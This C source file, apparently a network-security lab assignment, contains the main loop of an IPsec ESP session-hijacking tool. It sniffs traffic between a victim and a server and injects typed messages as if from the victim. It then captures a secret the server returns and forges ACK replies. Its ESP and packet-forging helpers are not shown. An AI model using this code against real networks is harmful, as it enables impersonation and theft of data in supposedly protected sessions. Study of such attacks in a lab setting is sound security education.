#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#include <sys/time.h>

#include "dev.h"
#include "net.h"
#include "esp.h"
#include "transport.h"
#include "replay.h"

void ipsec_hijack(char *INTERFACE)
{
    Dev dev;
    Net net;
    Esp esp;
    Txp txp;

    init_dev(&dev, INTERFACE);
    init_net(&net);
    init_esp(&esp);
    init_txp(&txp);

    char *str = (char*)malloc(sizeof(char)*1024);

    fd_set readfds;
    struct timeval timeout = {
        .tv_sec = 0,
        .tv_usec = 1
    };

    bool first = true;
    int *state = (int*)malloc(sizeof(int));
    *state = WAIT_PKT;
    /*
     * state WAIT_PKT: wait for packet sent by victim to get the information of the header
     * state WAIT_SECRET: after sending message to server, you will start to wait for secret sent by server
     * state SEND_ACK: after successfully get the secret, you shoud send ACK back to server
     */
    bool* test_for_dissect = (bool*)malloc(sizeof(bool));
    *test_for_dissect = true;
    char* victim_ip = (char*)malloc(sizeof(char)*64);
    char* server_ip = (char*)malloc(sizeof(char)*64);
    while(1){
        /*you have to get the information from the packet you are sniffing*/
        get_info(&dev, &net, &esp, &txp, state, victim_ip, server_ip, test_for_dissect);

        if(first){
            first = false;
            strcpy(victim_ip, net.src_ip);
            strcpy(server_ip, net.dst_ip);
        }

        if(*state == SEND_ACK){
            /*
            * when receiver receive a packet from sender, receiver should reply a ACK packet to sender, then sender will know that
            * the packet has been received successfully. So we also have to reply a ACK to server, after we receive the secret.
            */
            send_msg(&dev, &net, &esp, &txp, NULL);
            *state = WAIT_PKT;
            get_info(&dev, &net, &esp, &txp, state, victim_ip, server_ip, test_for_dissect);
        }

        char const * const x_src_ip = strdup(net.x_src_ip);
        char const * const x_dst_ip = strdup(net.x_dst_ip);

        strcpy(net.x_src_ip, x_src_ip);
        strcpy(net.x_dst_ip, x_dst_ip);

        FD_ZERO(&readfds);
        FD_SET(fileno(stdin), &readfds);

        memset(str, 0, sizeof(char)*1024);

        if(select(fileno(stdin)+1, &readfds, NULL, NULL, &timeout) < 0){
            exit(1);
        }
        if(FD_ISSET(fileno(stdin), &readfds)){
            if(fgets(str, 1024, stdin) == NULL){
                return;
            }
            /* send the message you input on the screen to server */
            send_msg(&dev, &net, &esp, &txp, str);
            *state = WAIT_SECRET;
        }
    }
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <if_name>\n", argv[0]);
        exit(1);
    }
    ipsec_hijack(argv[1]);
}
